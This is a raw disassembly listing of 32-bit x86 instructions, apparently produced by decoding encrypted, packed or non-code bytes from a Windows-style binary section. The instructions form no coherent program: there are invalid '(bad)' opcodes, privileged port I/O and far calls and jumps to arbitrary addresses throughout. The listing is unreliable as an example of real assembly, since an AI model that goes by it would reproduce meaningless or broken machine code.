  40ad4e:	test   al,0x4b
  40ad50:	add    ecx,ebx
  40ad52:	ror    BYTE PTR [eax+0x76],0xd3
  40ad56:	push   ebp
  40ad57:	lahf   
  40ad58:	add    al,0x4e
  40ad5a:	test   al,0x84
  40ad5c:	jo     0x40acf8
  40ad5e:	jbe    0x40ad9a
  40ad60:	cmp    DWORD PTR [ecx+esi*4],esi
  40ad63:	loopne 0x40ad77
  40ad65:	add    cl,ah
  40ad67:	ins    DWORD PTR es:[edi],dx
  40ad68:	retf   
  40ad69:	loop   0x40ad63
  40ad6b:	jo     0x40acf0
  40ad6d:	call   0xc30e:0x50f377f5
  40ad74:	cld    
  40ad75:	cmp    bh,dl
  40ad77:	test   DWORD PTR [esi+0x31],0x68a5ae4f
  40ad7e:	or     BYTE PTR [eax+0x1da96f0b],ch
  40ad84:	call   0x1f5aa403
  40ad89:	mov    cl,0x20
  40ad8b:	mov    edx,0xc1e5c592
  40ad90:	and    BYTE PTR [ecx],0x6c
  40ad93:	push   0xc35b29e
  40ad98:	aas    
  40ad99:	sbb    edx,edi
  40ad9b:	pop    eax
  40ad9c:	mov    bl,0x31
  40ad9e:	sar    BYTE PTR [esp+ebp*1+0x42],1
  40ada2:	mov    dl,0x98
  40ada4:	mov    ah,0x6f
  40ada6:	pop    edx
  40ada7:	retf   
  40ada8:	jge    0x40ad44
  40adaa:	cmp    DWORD PTR [eax-0x37],esi
  40adad:	dec    ecx
  40adae:	lds    edi,FWORD PTR [ebx+0x1d]
  40adb1:	pop    ebx
  40adb2:	mov    ds:0x2685965f,eax
  40adb7:	mov    bl,0x7b
  40adb9:	mov    ds:0x4b344ed8,eax
  40adbe:	aad    0xf5
  40adc0:	xchg   esp,eax
  40adc1:	or     eax,0x4f4291c1
  40adc6:	jge    0x40ad66
  40adc8:	in     al,dx
  40adc9:	inc    edx
  40adca:	pop    esp
  40adcb:	pop    ds
  40adcc:	xchg   edi,eax
  40adcd:	mov    edx,0x6ad915ee
  40add2:	les    eax,FWORD PTR [ebx]
  40add4:	jne    0x40adde
  40add6:	and    dl,BYTE PTR [ebx-0x4451a971]
  40addc:	push   ecx
  40addd:	mov    eax,ds:0x6fe20e47
  40ade2:	idiv   esi
  40ade4:	int    0x52
  40ade6:	jns    0x40ad79
  40ade8:	pop    es
  40ade9:	sbb    dh,al
  40adeb:	sub    bh,cl
  40aded:	aam    0xd8
  40adef:	push   edx
  40adf0:	sbb    esp,DWORD PTR [edx-0x5f]
  40adf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adf4:	idiv   dh
  40adf6:	or     BYTE PTR [ebx-0x79],0x8f
  40adfa:	adc    eax,0xb0036057
  40adff:	addr16 push edx
  40ae01:	sahf   
  40ae02:	xchg   ebx,eax
  40ae03:	cmp    bl,bl
  40ae05:	mov    ecx,0xb758c289
  40ae0a:	loope  0x40add8
  40ae0c:	gs nop
  40ae0e:	pushf  
  40ae0f:	cmp    eax,0xcd85086c
  40ae14:	pop    esi
  40ae15:	sub    edx,DWORD PTR [ecx+edx*8+0x55056d21]
  40ae1c:	outs   dx,BYTE PTR ds:[esi]
  40ae1d:	add    al,0xeb
  40ae1f:	cwde   
  40ae20:	cld    
  40ae21:	pop    ebx
  40ae22:	or     eax,0xc8cbd49e
  40ae27:	sbb    edi,DWORD PTR [ebx]
  40ae29:	bound  edi,QWORD PTR [ebp+0x28]
  40ae2c:	mov    ecx,0x7ebab658
  40ae31:	inc    edi
  40ae32:	in     al,0xeb
  40ae34:	dec    edi
  40ae35:	nop
  40ae36:	iret   
  40ae37:	aaa    
  40ae38:	ins    DWORD PTR es:[edi],dx
  40ae39:	xor    eax,0x9e3ababc
  40ae3e:	aad    0x97
  40ae40:	cmp    DWORD PTR [ecx+ebx*8+0x184992e7],ebx
  40ae47:	out    dx,al
  40ae48:	std    
  40ae49:	cli    
  40ae4a:	xor    edx,ebp
  40ae4c:	lds    ebp,FWORD PTR [edi-0x41]
  40ae4f:	(bad)  
  40ae50:	and    ecx,DWORD PTR [edi+ecx*1-0x67a8186e]
  40ae57:	pop    eax
  40ae58:	adc    bh,BYTE PTR [edi]
  40ae5a:	test   BYTE PTR [edi],ah
  40ae5c:	mul    DWORD PTR [ecx-0x3d4d6d]
  40ae62:	jbe    0x40ae5f
  40ae64:	daa    
  40ae65:	inc    esp
  40ae66:	(bad)  
  40ae67:	out    dx,al
  40ae68:	out    dx,eax
  40ae69:	inc    ecx
  40ae6a:	into   
  40ae6b:	xchg   ebx,eax
  40ae6c:	(bad)  
  40ae6d:	sti    
  40ae6e:	push   ss
  40ae6f:	movhps xmm7,QWORD PTR [ecx]
  40ae72:	and    DWORD PTR [eax-0x622de284],0x16
  40ae79:	loop   0x40ae4a
  40ae7b:	cmp    al,0x13
  40ae7d:	mov    ch,0x9a
  40ae7f:	cs cwde 
  40ae81:	pop    edi
  40ae82:	sbb    DWORD PTR [edi],edx
  40ae84:	sub    BYTE PTR [ecx-0x3f],cl
  40ae87:	xchg   edi,eax
  40ae88:	aam    0xa5
  40ae8a:	pushf  
  40ae8b:	scas   al,BYTE PTR es:[edi]
  40ae8c:	sub    al,0x88
  40ae8e:	pop    ebp
  40ae8f:	clc    
  40ae90:	out    0x60,al
  40ae92:	or     DWORD PTR [esi-0x7de03f98],edi
  40ae98:	cmp    eax,0x545b8fd2
  40ae9d:	xor    eax,0x77f69afb
  40aea2:	out    dx,al
  40aea3:	jnp    0x40aeeb
  40aea5:	in     al,dx
  40aea6:	sbb    al,dl
  40aea8:	pop    edi
  40aea9:	push   0xecea618b
  40aeae:	je     0x40aed1
  40aeb0:	scas   al,BYTE PTR es:[edi]
  40aeb1:	mov    DWORD PTR [ecx],esp
  40aeb3:	mov    BYTE PTR [eax+0x1e],ah
  40aeb6:	sar    DWORD PTR [eax],0xff
  40aeb9:	aaa    
  40aeba:	arpl   WORD PTR [esp+esi*8-0x5b],cx
  40aebe:	call   0x80ec:0x349fa358
  40aec5:	pop    ecx
  40aec6:	cmp    ah,BYTE PTR [ecx-0x2ab6bc38]
  40aecc:	pop    es
  40aecd:	cmp    cl,BYTE PTR [eax+0x55]
  40aed0:	stc    
  40aed1:	out    dx,al
  40aed2:	mov    bh,dh
  40aed4:	rcr    ebp,0xf1
  40aed7:	cmp    al,0x7d
  40aed9:	pop    ss
  40aeda:	std    
  40aedb:	xor    al,0x30
  40aedd:	test   dl,dh
  40aedf:	cmp    eax,DWORD PTR [esi-0x698821f6]
  40aee5:	adc    ebp,DWORD PTR [esi]
  40aee7:	mov    bh,0x14
  40aee9:	jp     0x40ae81
  40aeeb:	adc    bh,BYTE PTR [ebp+0x665ce840]
  40aef1:	test   eax,0x52096741
  40aef6:	xchg   esi,eax
  40aef7:	push   edi
  40aef8:	lahf   
  40aef9:	(bad)  [eax-0x6d1ba829]
  40aeff:	das    
  40af00:	mov    ds:0x3e0264bd,eax
  40af05:	mov    esi,0xaf56976
  40af0a:	fs push edi
  40af0c:	rol    BYTE PTR [ecx-0x2f0a1b1e],1
  40af12:	aad    0x5c
  40af14:	or     al,BYTE PTR [ecx-0x14]
  40af17:	idiv   ch
  40af19:	jmp    0x92550a53
  40af1e:	cmc    
  40af1f:	jl     0x40af0c
  40af21:	cwde   
  40af22:	nop
  40af23:	jl     0x40af0d
  40af25:	icebp  
  40af26:	pop    ebp
  40af27:	cld    
  40af28:	mov    edx,0x7ef1dd73
  40af2d:	loopne 0x40af16
  40af2f:	pop    ebp
  40af30:	lahf   
  40af31:	shl    DWORD PTR [ecx],cl
  40af33:	retf   0xecb2
  40af36:	stos   BYTE PTR es:[edi],al
  40af37:	adc    ch,BYTE PTR [ecx-0x64]
  40af3a:	ins    BYTE PTR es:[edi],dx
  40af3b:	aad    0xd6
  40af3d:	cmp    eax,0x84cffa2a
  40af42:	xor    ecx,DWORD PTR ds:0x3078234
  40af48:	ins    DWORD PTR es:[edi],dx
  40af49:	jmp    0x39e9:0x8a9e1ce5
  40af50:	push   edx
  40af51:	imul   eax,DWORD PTR [esi+esi*1],0x2ede8807
  40af58:	xlat   BYTE PTR ds:[ebx]
  40af59:	rcr    BYTE PTR [eax+0x2f09a1f5],cl
  40af5f:	ja     0x40afc6
  40af61:	jb     0x40afb2
  40af63:	mov    esp,0xada30daf
  40af68:	in     eax,dx
  40af69:	push   0x38
  40af6b:	sahf   
  40af6c:	out    dx,al
  40af6d:	lds    ebx,FWORD PTR ds:0x90658785
  40af73:	dec    ebp
  40af74:	retf   0xd0a5
  40af77:	outs   dx,DWORD PTR ds:[esi]
  40af78:	shr    DWORD PTR [edi],1
  40af7a:	cld    
  40af7b:	sub    eax,0x87678b74
  40af80:	inc    eax
  40af81:	mov    BYTE PTR [eax-0x3fa1df90],0x4
  40af88:	push   edx
  40af89:	jns    0x40af6f
  40af8b:	adc    al,0x71
  40af8d:	xor    DWORD PTR [edx-0x31],esp
  40af90:	mov    ch,al
  40af92:	test   BYTE PTR [edi-0x1a],0x35
  40af96:	(bad)  
  40af97:	xchg   esi,eax
  40af98:	sub    edx,0xfffffff3
  40af9b:	mov    ds:0x80c72f04,eax
  40afa0:	(bad)  
  40afa1:	fwait
  40afa2:	scas   al,BYTE PTR es:[edi]
  40afa3:	sub    ecx,0x648cafd4
  40afa9:	test   dh,dh
  40afab:	pop    ds
  40afac:	lock jl 0x40af5d
  40afaf:	sbb    esi,DWORD PTR [eax]
  40afb1:	pop    es
  40afb2:	es mov bl,0x3d
  40afb5:	pushf  
  40afb6:	cmp    edx,DWORD PTR [ebx]
  40afb8:	push   ss
  40afb9:	or     ah,BYTE PTR [ebp-0x242fd46]
  40afbf:	adc    DWORD PTR [ebx],edi
  40afc1:	sbb    BYTE PTR [edx-0x67],al
  40afc4:	out    dx,al
  40afc5:	sub    ecx,DWORD PTR [ebx+0x23df4b8c]
  40afcb:	cmp    ah,BYTE PTR [ecx]
  40afcd:	iret   
  40afce:	ja     0x40af8b
  40afd0:	popf   
  40afd1:	or     esp,DWORD PTR [eax+0x3b]
  40afd4:	or     al,0x32
  40afd6:	jle    0x40b028
  40afd8:	fsubr  QWORD PTR [edx-0x4e]
  40afdb:	push   0x7889fc45
  40afe0:	stc    
  40afe1:	sub    al,dh
  40afe3:	push   cs
  40afe4:	retf   
  40afe5:	jmp    0x40b01e
  40afe7:	and    edx,eax
  40afe9:	mov    eax,ds:0xdd3f0d04
  40afee:	mov    ebx,0x49c2b94c
  40aff3:	lds    ebp,FWORD PTR [edx-0x70baff5c]
  40aff9:	ins    BYTE PTR es:[edi],dx
  40affa:	mov    ds:0x7449b25,eax
  40afff:	out    dx,al
  40b000:	js     0x40b01f
  40b002:	push   edi
  40b003:	hlt    
  40b004:	dec    eax
  40b005:	push   edi
  40b006:	sub    al,0x95
  40b008:	fcomp  st(2)
  40b00a:	lds    eax,FWORD PTR [eax]
  40b00c:	ret    0x5be
  40b00f:	out    0x99,eax
  40b011:	lock stc 
  40b013:	(bad)  [ebp+0x22db4acd]
  40b019:	rcl    esp,0xcc
  40b01c:	mov    WORD PTR [esi+edx*2],?
  40b01f:	lahf   
  40b020:	xchg   esp,eax
  40b021:	call   0xaf5aa27
  40b026:	pop    ebx
  40b027:	and    eax,0xd17f533a
  40b02c:	xchg   edx,eax
  40b02d:	pop    ebp
  40b02e:	jae    0x40afd7
  40b030:	stos   BYTE PTR es:[edi],al
  40b031:	sbb    esi,DWORD PTR [ebp+0x66d366e0]
  40b037:	clc    
  40b038:	adc    eax,0x24d78d9
  40b03d:	call   0x2d0283d0
  40b042:	ds inc BYTE PTR ss:[eax]
  40b046:	add    BYTE PTR [ecx],dl
  40b048:	loopne 0x40afd8
  40b04a:	jnp    0x40b0c8
  40b04c:	mov    DWORD PTR ds:0x1b5cba18,edi
  40b052:	dec    edi
  40b053:	pop    ss
  40b054:	div    DWORD PTR [edi-0x9]
  40b057:	inc    edx
  40b058:	pop    ds
  40b059:	sbb    eax,DWORD PTR [edx+esi*4]
  40b05c:	leave  
  40b05d:	idiv   DWORD PTR [ebp-0x59]
  40b060:	scas   al,BYTE PTR es:[edi]
  40b061:	aas    
  40b062:	sbb    edx,ebp
  40b064:	jns    0x40b09d
  40b066:	lock xlat BYTE PTR ds:[ebx]
  40b068:	pop    esp
  40b069:	xor    eax,0x67d97a2f
  40b06e:	dec    ebx
  40b06f:	xor    cl,dh
  40b071:	idiv   DWORD PTR [ebx-0x35c63431]
  40b077:	pop    eax
  40b078:	jae    0x40b0d4
  40b07a:	int    0xf2
  40b07c:	adc    al,0x71
  40b07e:	inc    eax
  40b07f:	sbb    ebp,DWORD PTR [ecx]
  40b081:	mov    bl,0x3b
  40b083:	adc    DWORD PTR [eax+0x1b0729c],ebx
  40b089:	jns    0x40b0a3
  40b08b:	cwde   
  40b08c:	icebp  
  40b08d:	mov    ebx,0x8c6fedaa
  40b092:	rcr    DWORD PTR [ecx-0x58],1
  40b095:	je     0x40b0c8
  40b097:	int3   
  40b098:	retf   
  40b099:	ins    BYTE PTR es:[edi],dx
  40b09a:	xadd   esi,ebp
  40b09d:	mul    BYTE PTR [eax-0x1c]
  40b0a0:	xchg   ebp,eax
  40b0a1:	pushf  
  40b0a2:	mov    ebp,tr0
  40b0a5:	and    al,BYTE PTR [ecx]
  40b0a7:	loopne 0x40b06f
  40b0a9:	loope  0x40b10f
  40b0ab:	jp     0x40b085
  40b0ad:	xor    BYTE PTR [eax-0x6e],bl
  40b0b0:	xchg   edi,eax
  40b0b1:	test   al,0x7f
  40b0b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0b5:	push   ebx
  40b0b6:	jb     0x40b12a
  40b0b8:	ret    0xcb1a
  40b0bb:	das    
  40b0bc:	repnz cmp edi,DWORD PTR [ebp-0x42d24d24]
  40b0c3:	out    dx,eax
  40b0c4:	daa    
  40b0c5:	hlt    
  40b0c6:	cli    
  40b0c7:	mov    eax,ds:0x14799849
  40b0cc:	xchg   ecx,eax
  40b0cd:	xor    DWORD PTR [esi+ecx*4],eax
  40b0d0:	sub    DWORD PTR [esi+esi*4],esp
  40b0d3:	add    DWORD PTR [ebx-0x37],eax
  40b0d6:	scas   eax,DWORD PTR es:[edi]
  40b0d7:	loopne 0x40b05e
  40b0d9:	lahf   
  40b0da:	pop    edi
  40b0db:	xor    ch,dh
  40b0dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0de:	sbb    ebx,ecx
  40b0e0:	aam    0x7d
  40b0e2:	call   0x566871d4
  40b0e7:	push   ebp
  40b0e8:	mov    ch,0xb2
  40b0ea:	adc    ch,BYTE PTR [esi]
  40b0ec:	sbb    eax,0x21f0fdd7
  40b0f1:	fcomp  DWORD PTR [edx+0x3e]
  40b0f4:	clc    
  40b0f5:	pushf  
  40b0f6:	push   ds
  40b0f7:	addr16 or al,0x2e
  40b0fa:	jno    0x40b09d
  40b0fc:	jo     0x40b0d9
  40b0fe:	xchg   esp,eax
  40b0ff:	lods   eax,DWORD PTR ds:[esi]
  40b100:	sub    DWORD PTR [eax+0x4790deb1],eax
  40b106:	or     DWORD PTR [ebp+esi*8+0x62],eax
  40b10a:	out    dx,eax
  40b10b:	jae    0x40b162
  40b10d:	ret    
  40b10e:	out    0xb7,eax
  40b110:	dec    ebp
  40b111:	fmul   QWORD PTR ds:0x753d60b
  40b117:	popa   
  40b118:	int    0xc0
  40b11a:	stc    
  40b11b:	xor    BYTE PTR [edi+0x52d6ddbc],dh
  40b121:	push   edi
  40b122:	rcr    DWORD PTR [ebp+0x7070952a],1
  40b128:	pop    edi
  40b129:	mov    al,0x59
  40b12b:	or     bh,cl
  40b12d:	inc    eax
  40b12e:	call   0x42a2:0x97e7b873
  40b135:	pusha  
  40b136:	mov    dl,0x51
  40b138:	daa    
  40b139:	lock inc ebp
  40b13b:	inc    ecx
  40b13c:	push   ebx
  40b13d:	je     0x40b10f
  40b13f:	fcomp  DWORD PTR [edx-0x37]
  40b142:	push   es
  40b143:	in     al,0x7b
  40b145:	setne  BYTE PTR [ecx]
  40b148:	and    al,0x6
  40b14a:	rcr    DWORD PTR [esi+0x54],cl
  40b14d:	lock cmc 
  40b14f:	jmp    0x40b1ce
  40b151:	push   ebp
  40b152:	mov    dh,0xec
  40b154:	add    dh,0x15
  40b157:	jno    0x40b0e4
  40b159:	loopne 0x40b11a
  40b15b:	rol    DWORD PTR [eax-0x3b5f9a39],0x9a
  40b162:	leave  
  40b163:	and    ecx,esi
  40b165:	sti    
  40b166:	push   esi
  40b167:	xchg   ebp,eax
  40b168:	nop
  40b169:	push   ebx
  40b16a:	mov    DWORD PTR [edx],esi
  40b16c:	mov    ds:0xdc5642d1,eax
  40b171:	add    eax,0xd31f5b0f
  40b176:	stos   DWORD PTR es:[edi],eax
  40b177:	xchg   ecx,eax
  40b178:	movd   DWORD PTR [ecx-0x5fb6ec2b],mm2
  40b17f:	dec    esp
  40b180:	add    BYTE PTR [ebx],ah
  40b182:	stos   BYTE PTR es:[edi],al
  40b183:	inc    ecx
  40b184:	data16 mov al,ds:0x791ab736
  40b18a:	jb     0x40b157
  40b18c:	mov    ds:0xa686682d,eax
  40b191:	(bad)  
  40b192:	or     eax,0x51959ec6
  40b197:	iret   
  40b198:	fcomip st,st(5)
  40b19a:	jns    0x40b1fa
  40b19c:	(bad)  
  40b19d:	cmc    
  40b19e:	mov    es,ebx
  40b1a0:	nop
  40b1a1:	pop    eax
  40b1a2:	jbe    0x40b196
  40b1a4:	add    al,BYTE PTR [ebx+0x58428bd6]
  40b1aa:	pop    es
  40b1ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1ac:	dec    ecx
  40b1ad:	xchg   ebx,eax
  40b1ae:	sti    
  40b1af:	int3   
  40b1b0:	mov    ebx,0xe4a598ee
  40b1b5:	gs adc eax,0x67076d3c
  40b1bb:	cld    
  40b1bc:	and    BYTE PTR [eax+0x2536c510],al
  40b1c2:	pop    esp
  40b1c3:	jg     0x40b16a
  40b1c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1c6:	cmp    al,0xc2
  40b1c8:	imul   edx,DWORD PTR ds:0xffd4b0eb,0xd90c5878
  40b1d2:	sar    DWORD PTR [ebx-0x76],0x7f
  40b1d6:	sbb    BYTE PTR [eax],cl
  40b1d8:	arpl   WORD PTR [edx+esi*2+0x5d],sp
  40b1dc:	inc    edx
  40b1dd:	pop    ecx
  40b1de:	dec    ebx
  40b1df:	cmp    dl,BYTE PTR [ebp+edi*8-0x5d]
  40b1e3:	inc    eax
  40b1e4:	jl     0x40b209
  40b1e6:	fiadd  WORD PTR [ecx]
  40b1e8:	jno    0x40b1c0
  40b1ea:	xlat   BYTE PTR ds:[ebx]
  40b1eb:	inc    ebx
  40b1ec:	push   ebx
  40b1ed:	push   edx
  40b1ee:	inc    ebx
  40b1ef:	std    
  40b1f0:	add    BYTE PTR [edi+0x42],bh
  40b1f3:	inc    esi
  40b1f4:	loop   0x40b247
  40b1f6:	sbb    al,0xf
  40b1f8:	cs jne 0x40b274
  40b1fb:	sbb    esp,DWORD PTR [ecx+0x234c68b4]
  40b201:	sbb    DWORD PTR [edi],esi
  40b203:	ds pop ebx
  40b205:	jno    0x40b1ae
  40b207:	mov    cl,0x38
  40b209:	rol    BYTE PTR [esi],0x89
  40b20c:	jb     0x40b24d
  40b20e:	aas    
  40b20f:	xor    al,0x18
  40b211:	push   eax
  40b212:	call   0xd27e:0x5c6818ce
  40b219:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b21a:	push   esi
  40b21b:	push   ebx
  40b21c:	hlt    
  40b21d:	loop   0x40b254
  40b21f:	add    BYTE PTR [edx+0x3],ch
  40b222:	ror    BYTE PTR [eax-0x7c],1
  40b225:	sbb    dh,BYTE PTR [ebp-0x431ba153]
  40b22b:	dec    edi
  40b22c:	jg     0x40b1be
  40b22e:	aaa    
  40b22f:	sub    eax,0x8e6563ad
  40b234:	loope  0x40b234
  40b236:	test   DWORD PTR [edx],ecx
  40b238:	cmp    ecx,edi
  40b23a:	add    esp,edi
  40b23c:	mov    dl,0x16
  40b23e:	jo     0x40b266
  40b240:	retf   0xb1ee
  40b243:	and    eax,0xdd0a65dd
  40b248:	jne    0x40b205
  40b24a:	xor    eax,0x8bc00d5d
  40b24f:	cmp    al,0xce
  40b251:	dec    eax
  40b252:	aas    
  40b253:	repnz sar DWORD PTR [edx],cl
  40b256:	cmp    edx,ebx
  40b258:	call   0x2d760d70
  40b25d:	test   eax,0x938d7809
  40b262:	sti    
  40b263:	cli    
  40b264:	mov    ebx,0x53c61e66
  40b269:	jo     0x9bb9f36c
  40b26f:	dec    edi
  40b270:	lods   al,BYTE PTR ds:[esi]
  40b271:	lods   al,BYTE PTR ds:[esi]
  40b272:	imul   ebx,DWORD PTR [ecx-0xbea44f8],0x36
  40b279:	and    bl,BYTE PTR [ebx+0x8]
  40b27c:	sbb    cx,WORD PTR [ebx+ecx*1-0x64ee22ca]
  40b284:	xchg   edx,eax
  40b285:	sbb    eax,0xa0d1d486
  40b28a:	dec    edi
  40b28b:	lods   eax,DWORD PTR ds:[esi]
  40b28c:	mov    edi,0xa4e27df7
  40b291:	xchg   edx,eax
  40b292:	push   edi
  40b293:	fsub   st(4),st
  40b295:	mov    edi,0x5a051ddd
  40b29a:	rcl    BYTE PTR [ebx+0x6b],0xa5
  40b29e:	pushf  
  40b29f:	mov    esp,0x4d4b8029
  40b2a4:	sahf   
  40b2a5:	xor    al,0x81
  40b2a7:	adc    BYTE PTR [ebp+0x17],dh
  40b2aa:	adc    al,0xa6
  40b2ac:	inc    esi
  40b2ad:	rcr    bh,cl
  40b2af:	pop    ds
  40b2b0:	(bad)  
  40b2b1:	sbb    eax,0x92372445
  40b2b6:	inc    ecx
  40b2b7:	aad    0xdb
  40b2b9:	xchg   esi,eax
  40b2ba:	loopne 0x40b2b4
  40b2bc:	les    ebx,FWORD PTR [ebp-0x7c]
  40b2bf:	sub    dl,BYTE PTR [ecx]
  40b2c1:	or     ah,BYTE PTR [eax]
  40b2c3:	cmp    BYTE PTR [edi+0x6c38e901],ah
  40b2c9:	push   ebp
  40b2ca:	ins    BYTE PTR es:[edi],dx
  40b2cb:	add    eax,0x10d8bd0
  40b2d0:	mov    al,ds:0x698e70c6
  40b2d5:	jae    0x40b325
  40b2d7:	arpl   WORD PTR [eax+0x55],di
  40b2da:	hlt    
  40b2db:	retf   
  40b2dc:	sbb    eax,0x90eaf8db
  40b2e1:	cwde   
  40b2e2:	je     0x40b2af
  40b2e4:	aaa    
  40b2e5:	repz xor bh,dl
  40b2e8:	(bad)  
  40b2e9:	scas   al,BYTE PTR es:[edi]
  40b2ea:	mov    dl,0x96
  40b2ec:	dec    ecx
  40b2ed:	pop    ebx
  40b2ee:	bound  esi,QWORD PTR [edx+0x4acb21c0]
  40b2f4:	je     0x40b300
  40b2f6:	dec    ebx
  40b2f7:	pop    edi
  40b2f8:	add    bl,ah
  40b2fa:	test   ah,0xa8
  40b2fd:	dec    ecx
  40b2fe:	add    edx,eax
  40b300:	je     0x40b2e5
  40b302:	mov    cl,0x7d
  40b304:	dec    ebp
  40b305:	adc    DWORD PTR [edx],edi
  40b307:	lds    eax,FWORD PTR es:[edi]
  40b30a:	cmp    al,0x2e
  40b30c:	and    eax,0x641636db
  40b311:	and    eax,0x68c3e9d6
  40b316:	ja     0x40b322
  40b318:	ins    BYTE PTR es:[edi],dx
  40b319:	bound  ebx,QWORD PTR es:[esi+ecx*4-0x2d]
  40b31e:	push   esi
  40b31f:	outs   dx,BYTE PTR ds:[esi]
  40b320:	out    dx,al
  40b321:	mov    dl,0x37
  40b323:	sbb    eax,0xbd36d679
  40b328:	or     cl,BYTE PTR [eax]
  40b32a:	cwde   
  40b32b:	pop    es
  40b32c:	faddp  st(6),st
  40b32e:	add    ecx,ebx
  40b330:	add    ah,BYTE PTR ds:0x998993cc
  40b336:	fmul   DWORD PTR [edi+0x3cc9a66e]
  40b33c:	aad    0xa
  40b33e:	fldenv [ebp-0x2b]
  40b341:	and    DWORD PTR [edx+0x56],eax
  40b344:	and    al,0xdb
  40b346:	sti    
  40b347:	int3   
  40b348:	data16 jl 0x40b35e
  40b34b:	push   0x79960e3b
  40b350:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b351:	xchg   ebx,eax
  40b352:	jmp    0x40b325
  40b354:	ss scas eax,DWORD PTR es:[edi]
  40b356:	sbb    edi,DWORD PTR [esi-0x27]
  40b359:	inc    ebx
  40b35a:	push   esp
  40b35b:	jecxz  0x40b390
  40b35d:	xor    eax,esi
  40b35f:	jb     0x40b39d
  40b361:	ret    
  40b362:	jmp    0x40b359
  40b364:	adc    ebx,eax
  40b366:	fcom   QWORD PTR [esi+0x2a781f03]
  40b36c:	jbe    0x40b31a
  40b36e:	outs   dx,BYTE PTR ds:[esi]
  40b36f:	add    cl,BYTE PTR [ebx+0x75]
  40b372:	clc    
  40b373:	pop    ebx
  40b374:	push   ecx
  40b375:	xchg   DWORD PTR [ebx+ebp*8+0x271f1a7b],edi
  40b37c:	push   ecx
  40b37d:	in     eax,0xf3
  40b37f:	neg    eax
  40b381:	push   ss
  40b382:	fdiv   st(3),st
  40b384:	and    eax,0x2040bf1c
  40b38a:	sbb    ah,bh
  40b38c:	jg     0x40b3b7
  40b38e:	sub    WORD PTR [edx+ebx*1-0x73],dx
  40b393:	out    0xae,al
  40b395:	fcom   QWORD PTR [ebx]
  40b397:	xor    ch,BYTE PTR [edi]
  40b399:	dec    edi
  40b39a:	jo     0x40b408
  40b39c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b39d:	sbb    BYTE PTR [esi-0x2c],ah
  40b3a0:	ret    0x122
  40b3a3:	push   edi
  40b3a4:	mov    ebx,0x914e5d3c
  40b3a9:	mov    dl,0x9a
  40b3ab:	jge    0x40b367
  40b3ad:	pop    ss
  40b3ae:	cmp    esp,ecx
  40b3b0:	outs   dx,BYTE PTR ds:[esi]
  40b3b1:	dec    eax
  40b3b2:	sbb    ecx,ebp
  40b3b4:	push   edi
  40b3b5:	fistp  QWORD PTR [edi+0x1]
  40b3b8:	cs mov al,0x5
  40b3bb:	daa    
  40b3bc:	xor    al,BYTE PTR [edx-0x7ab57128]
  40b3c2:	test   BYTE PTR [esi-0x31f5262d],0xda
  40b3c9:	outs   dx,BYTE PTR ds:[esi]
  40b3ca:	cmp    ch,ch
  40b3cc:	inc    ecx
  40b3cd:	leave  
  40b3ce:	imul   eax,DWORD PTR [edi-0x77fdadae],0xffffff9b
  40b3d5:	or     edx,DWORD PTR [edi-0x5e]
  40b3d8:	sub    esp,ebx
  40b3da:	mov    esp,0xb1097bf5
  40b3df:	fbstp  TBYTE PTR [ebx-0xc]
  40b3e2:	(bad)  
  40b3e3:	shl    DWORD PTR [edx],1
  40b3e5:	(bad)  
  40b3e6:	(bad)  
  40b3e7:	sbb    BYTE PTR [edi],cl
  40b3e9:	mov    ds:0x70ddc1fe,al
  40b3ee:	jl     0x40b3da
  40b3f0:	xchg   edx,eax
  40b3f1:	pop    edi
  40b3f2:	pop    esi
  40b3f3:	ds je  0x40b40b
  40b3f6:	push   0xd42d8586
  40b3fb:	inc    esi
  40b3fc:	cs mov ebp,0xd08f64f
  40b402:	sbb    eax,edi
  40b404:	xchg   esp,eax
  40b405:	call   0x3ac93b56
  40b40a:	cwde   
  40b40b:	xor    edx,eax
  40b40d:	or     BYTE PTR [edx],ch
  40b40f:	or     ebx,ecx
  40b411:	sbb    ebp,esi
  40b413:	sti    
  40b414:	mov    gs,WORD PTR [edi+eiz*8-0x25]
  40b418:	call   0xb649f17a
  40b41d:	dec    edi
  40b41e:	add    ch,dh
  40b420:	imul   ecx,DWORD PTR [eax-0x4b],0x2471adc8
  40b427:	retf   0xeffc
  40b42a:	sub    al,0x4a
  40b42c:	(bad)  
  40b42d:	icebp  
  40b42e:	mov    DWORD PTR [ebp-0x51],esi
  40b431:	aas    
  40b432:	push   esp
  40b433:	outs   dx,DWORD PTR ds:[esi]
  40b434:	ins    DWORD PTR es:[edi],dx
  40b435:	aaa    
  40b436:	out    0xa,al
  40b438:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b439:	cmp    BYTE PTR [edx],bh
  40b43b:	sbb    eax,ecx
  40b43d:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40b43f:	jae    0x40b44d
  40b441:	pop    ecx
  40b442:	mov    ecx,0x79dafb1f
  40b447:	jge    0x40b496
  40b449:	mov    ds:0x983ad277,al
  40b44e:	inc    esp
  40b44f:	leave  
  40b450:	cdq    
  40b451:	mov    ah,0x2d
  40b453:	mov    esp,0xc1db692a
  40b458:	mov    ah,0x97
  40b45a:	push   esi
  40b45b:	pop    edx
  40b45c:	adc    esp,esp
  40b45e:	xlat   BYTE PTR ds:[ebx]
  40b45f:	inc    eax
  40b460:	jmp    0x40b40b
  40b462:	pop    ebx
  40b463:	ins    BYTE PTR es:[edi],dx
  40b464:	stos   BYTE PTR es:[edi],al
  40b465:	and    eax,0xd178b8e2
  40b46a:	and    cl,BYTE PTR [eax-0x7a]
  40b46d:	and    eax,0x1bb418de
  40b472:	outs   dx,DWORD PTR ds:[esi]
  40b473:	dec    eax
  40b474:	cld    
  40b475:	add    dh,dh
  40b477:	sub    esp,DWORD PTR [ecx+ebp*2-0x3960527e]
  40b47e:	mov    dl,0x5a
  40b480:	adc    ah,BYTE PTR [esi-0x66]
  40b483:	aas    
  40b484:	jne    0x40b42a
  40b486:	in     eax,dx
  40b487:	ror    esp,cl
  40b489:	xchg   ebx,eax
  40b48a:	cmp    eax,0x3898d667
